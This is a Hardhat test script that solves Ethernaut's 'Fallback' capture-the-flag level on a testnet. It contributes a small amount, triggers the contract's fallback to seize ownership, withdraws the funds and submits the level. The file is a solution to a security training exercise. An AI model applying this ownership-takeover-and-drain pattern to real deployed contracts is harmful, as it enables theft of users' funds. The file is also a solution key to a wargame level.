// npx hardhat test ./test/01_fallback.js --network rinkeby

// We import Chai to use its asserting functions here.
const { expect } = require("chai");
const { ethers } = require("hardhat");
const ETHERNAUT_LEVELS = require("../ethernaut-levels-config.js")
const Utils = require("./Utils.js");

let levelContract;
const INTERFACE_CONTRACT = "Fallback";

before(async () => {
    levelContract = await Utils.getLevelContract(ETHERNAUT_LEVELS._01_fallback, INTERFACE_CONTRACT);
});

it("solves the level", async function () {
    const accounts = await ethers.getSigners();

    tx = await levelContract.contribute({
        value: ethers.utils.parseUnits(`1`, `wei`),
    });
    await tx.wait();

    tx = await accounts[0].sendTransaction({
        to: levelContract.address,
        value: ethers.utils.parseUnits(`1`, `wei`),
    });
    await tx.wait();

    tx = await levelContract.withdraw();
    await tx.wait();
});

after(async () => {
    expect(await Utils.submitLevel(levelContract.address), "level was not completed").to.be.true;
});